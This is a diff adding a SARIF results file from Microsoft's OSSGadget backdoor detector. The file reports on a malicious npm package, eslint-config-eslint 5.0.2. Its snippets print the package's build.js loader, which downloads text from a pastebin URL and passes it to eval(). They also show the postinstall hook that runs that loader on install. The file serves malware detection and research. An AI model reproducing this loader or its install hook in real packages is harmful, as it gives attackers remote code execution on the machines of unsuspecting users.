@@ -1,0 +1,204 @@
+{
+  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "oss-detect-backdoor",
+          "organization": "Microsoft Corporation",
+          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
+          "version": "0.0.0+4a24249b20"
+        }
+      },
+      "results": [
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/js/eslint-config-eslint-5.0.2.tgz/eslint-config-eslint-5.tar/package/build.js"
+                },
+                "region": {
+                  "startLine": 3,
+                  "startColumn": 5,
+                  "endLine": 3,
+                  "endColumn": 10,
+                  "snippet": {
+                    "text": "try{\nvar https=require('https');\nhttps.get({'hostname':'pastebin.com',path:'/raw/XLeVP82h',headers:{'User-Agent':'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',Accept:'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}},(r)=>{\nr.setEncoding('utf8');\nr.on('data',(c)=>{\neval(c);\n",
+                    "rendered": {
+                      "text": "try{\nvar https=require('https');\nhttps.get({'hostname':'pastebin.com',path:'/raw/XLeVP82h',headers:{'User-Agent':'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',Accept:'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}},(r)=>{\nr.setEncoding('utf8');\nr.on('data',(c)=>{\neval(c);\n",
+                      "markdown": "`try{\nvar https=require('https');\nhttps.get({'hostname':'pastebin.com',path:'/raw/XLeVP82h',headers:{'User-Agent':'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',Accept:'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}},(r)=>{\nr.setEncoding('utf8');\nr.on('data',(c)=>{\neval(c);\n`"
+                    }
+                  },
+                  "sourceLanguage": "javascript"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000704"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Hostname)",
+            "id": "BD000704"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/js/eslint-config-eslint-5.0.2.tgz/eslint-config-eslint-5.tar/package/build.js"
+                },
+                "region": {
+                  "startLine": 3,
+                  "startColumn": 12,
+                  "endLine": 3,
+                  "endColumn": 20,
+                  "snippet": {
+                    "text": "try{\nvar https=require('https');\nhttps.get({'hostname':'pastebin.com',path:'/raw/XLeVP82h',headers:{'User-Agent':'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',Accept:'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}},(r)=>{\nr.setEncoding('utf8');\nr.on('data',(c)=>{\neval(c);\n",
+                    "rendered": {
+                      "text": "try{\nvar https=require('https');\nhttps.get({'hostname':'pastebin.com',path:'/raw/XLeVP82h',headers:{'User-Agent':'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',Accept:'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}},(r)=>{\nr.setEncoding('utf8');\nr.on('data',(c)=>{\neval(c);\n",
+                      "markdown": "`try{\nvar https=require('https');\nhttps.get({'hostname':'pastebin.com',path:'/raw/XLeVP82h',headers:{'User-Agent':'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',Accept:'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}},(r)=>{\nr.setEncoding('utf8');\nr.on('data',(c)=>{\neval(c);\n`"
+                    }
+                  },
+                  "sourceLanguage": "javascript"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000500"
+          },
+          "message": {
+            "text": "Backdoor: Pastebin",
+            "id": "BD000500"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/js/eslint-config-eslint-5.0.2.tgz/eslint-config-eslint-5.tar/package/build.js"
+                },
+                "region": {
+                  "startLine": 3,
+                  "startColumn": 23,
+                  "endLine": 3,
+                  "endColumn": 31,
+                  "snippet": {
+                    "text": "try{\nvar https=require('https');\nhttps.get({'hostname':'pastebin.com',path:'/raw/XLeVP82h',headers:{'User-Agent':'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',Accept:'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}},(r)=>{\nr.setEncoding('utf8');\nr.on('data',(c)=>{\neval(c);\n",
+                    "rendered": {
+                      "text": "try{\nvar https=require('https');\nhttps.get({'hostname':'pastebin.com',path:'/raw/XLeVP82h',headers:{'User-Agent':'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',Accept:'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}},(r)=>{\nr.setEncoding('utf8');\nr.on('data',(c)=>{\neval(c);\n",
+                      "markdown": "`try{\nvar https=require('https');\nhttps.get({'hostname':'pastebin.com',path:'/raw/XLeVP82h',headers:{'User-Agent':'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',Accept:'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}},(r)=>{\nr.setEncoding('utf8');\nr.on('data',(c)=>{\neval(c);\n`"
+                    }
+                  },
+                  "sourceLanguage": "javascript"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000103"
+          },
+          "message": {
+            "text": "Backdoor: Installation Script",
+            "id": "BD000103"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/js/eslint-config-eslint-5.0.2.tgz/eslint-config-eslint-5.tar/package/package.json"
+                },
+                "region": {
+                  "startLine": 43,
+                  "startColumn": 5,
+                  "endLine": 43,
+                  "endColumn": 35,
+                  "snippet": {
+                    "text": "  \"scripts\": {\n    \"prepublish\": \"npm test\",\n    \"test\": \"node ./index.js\",\n    \"postinstall\": \"node ./build.js\"\n  },\n  \"version\": \"5.0.2\"\n}\n",
+                    "rendered": {
+                      "text": "  \"scripts\": {\n    \"prepublish\": \"npm test\",\n    \"test\": \"node ./index.js\",\n    \"postinstall\": \"node ./build.js\"\n  },\n  \"version\": \"5.0.2\"\n}\n",
+                      "markdown": "`  \"scripts\": {\n    \"prepublish\": \"npm test\",\n    \"test\": \"node ./index.js\",\n    \"postinstall\": \"node ./build.js\"\n  },\n  \"version\": \"5.0.2\"\n}\n`"
+                    }
+                  },
+                  "sourceLanguage": "package.json"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000600"
+          },
+          "message": {
+            "text": "Backdoor: LOLBAS: Windows Indicator",
+            "id": "BD000600"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/js/eslint-config-eslint-5.0.2.tgz/eslint-config-eslint-5.tar/package/README.md"
+                },
+                "region": {
+                  "startLine": 2,
+                  "startColumn": 16,
+                  "endLine": 2,
+                  "endColumn": 20,
+                  "snippet": {
+                    "text": "[![NPM version][npm-image]][npm-url]\n[![Join the chat at https://gitter.im/eslint/eslint](https://badges.gitter.im/Join%20Chat.svg)](https://gitter.im/eslint/eslint?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)\n\n# ESLint Configuration\n\n",
+                    "rendered": {
+                      "text": "[![NPM version][npm-image]][npm-url]\n[![Join the chat at https://gitter.im/eslint/eslint](https://badges.gitter.im/Join%20Chat.svg)](https://gitter.im/eslint/eslint?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)\n\n# ESLint Configuration\n\n",
+                      "markdown": "`[![NPM version][npm-image]][npm-url]\n[![Join the chat at https://gitter.im/eslint/eslint](https://badges.gitter.im/Join%20Chat.svg)](https://gitter.im/eslint/eslint?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)\n\n# ESLint Configuration\n\n`"
+                    }
+                  },
+                  "sourceLanguage": "Unknown"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 1
+          }
+        }
+      ],
+      "columnKind": "utf16CodeUnits"
+    }
+  ]
+}
